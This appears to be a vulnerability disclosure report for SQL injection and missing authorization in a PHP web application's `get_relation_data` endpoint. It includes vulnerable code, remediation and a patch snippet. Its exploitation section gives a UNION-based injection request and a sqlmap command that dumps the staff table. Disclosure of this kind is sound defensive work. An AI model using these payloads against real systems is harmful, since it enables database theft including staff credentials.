# VULN-04 — SQL Injection + Missing Authorization in `get_relation_data` (DB Compromise)

| | |
|---|---|
| **Researcher** | tal7aouy |
| **Severity** | High (CVSS 3.1: 8.8 — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) |
| **CWE** | CWE-89 (SQL Injection) + CWE-862 (Missing Authorization) |
| **Authentication** | Any logged-in staff (no permission gate) |
| **Components** | `application/controllers/admin/Misc.php:88-100`, `application/helpers/relation_helper.php:35,44,124` |

---

## 1. Summary

The AJAX endpoint `admin/misc/get_relation_data` has **no permission check** and forwards the `extra` POST array straight into a SQL `WHERE` clause. One branch concatenates `extra['client_id']` with **no escaping at all**; two others use the unquoted-`escape_str()` pattern from VULN-03. Any authenticated staff account — including the lowest privilege — can inject arbitrary SQL.

## 2. Root cause

```php
// application/controllers/admin/Misc.php  — NO has_permission() check
public function get_relation_data() {
    if ($this->input->post()) {
        $type = $this->input->post('type');
        $data = get_relation_data($type, '', $this->input->post('extra')); // attacker-controlled
        ...
    }
}
```

```php
// application/helpers/relation_helper.php
// line 35 — raw concatenation, NO escaping
$where_contacts .= ' AND '. db_prefix() . 'contacts.userid='. $extra['client_id'];

// line 44 — unquoted escape_str (still injectable, see VULN-03)
$where_contacts .= ' AND ' . db_prefix() . 'contacts.userid=' . $CI->db->escape_str($CI->input->post('contact_userid'));

// line 124 — unquoted escape_str
$where_projects .= 'clientid=' . $CI->db->escape_str($CI->input->post('customer_id'));
```

`$where_contacts` flows into `Misc_model::_search_contacts()` and is applied via `$this->db->where($where)`.

## 3. Exploitation

```
POST /admin/misc/get_relation_data
Cookie: <any staff session>
Content-Type: application/x-www-form-urlencoded

type=contact&extra[client_id]=0) UNION SELECT ... -- -
```

Because `extra['client_id']` (line 35) is concatenated with **no escaping**, both quote-based and quote-less payloads work. The results are returned in the JSON response, enabling direct UNION exfiltration.

Automated:
```bash
sqlmap -u "https://target/admin/misc/get_relation_data" \
  --cookie="<staff session>" \
  --data="type=contact&extra[client_id]=1" -p "extra[client_id]" \
  --dbms mysql --dump -T tblstaff
```

## 4. Impact

- Full database read/dump reachable by the lowest-privilege authenticated staff account.
- Authorization gap: a data-returning endpoint with no permission enforcement.

## 5. Remediation

1. Add a permission check to `Misc::get_relation_data()` appropriate to the relation type.
2. In `relation_helper.php`, cast/bind every identifier. See `patch.diff`.

```php
$where_contacts .= ' AND ' . db_prefix() . 'contacts.userid=' . (int) $extra['client_id'];
```

## 6. References
- CWE-862: https://cwe.mitre.org/data/definitions/862.html

— tal7aouy
